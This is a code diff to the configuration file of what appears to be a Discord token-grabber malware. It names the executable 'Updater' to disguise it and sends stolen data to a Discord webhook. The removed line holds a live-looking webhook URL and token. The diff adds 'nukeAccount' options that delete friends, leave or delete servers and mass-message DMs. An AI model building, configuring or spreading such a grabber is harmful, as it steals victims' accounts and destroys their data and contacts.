@@ -4,7 +4,7 @@ module.exports = {
   // The EXE name the grabber will have
   filename: 'Updater',
   webhook: {
-    url: 'https://discord.com/api/webhooks/1008130525665439816/wRlNXfACrEsTok15kBDKundj_6G6u1-ksvFOgQeqv_ZtS25wZfxkFJUn0k34pQnP7KFE',
+    url: '<WEBHOOK_URL>',
     content: '@everyone',
   },
   userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
@@ -25,6 +25,13 @@ module.exports = {
     // Do we need to kill the Discord desktop client process?
     killProcess: false,
     // `false` for disabling, a string with the invite code for enabling
-    autoJoinGuild: false
+    autoJoinGuild: false,
+    nukeAccount: {
+      removeAllFriends: false,
+      leaveAllGuilds: false,
+      deleteAllOwnedGuilds: false,
+      sendMessageToAllDMs: 'w',
+      
+    }
   }
 };
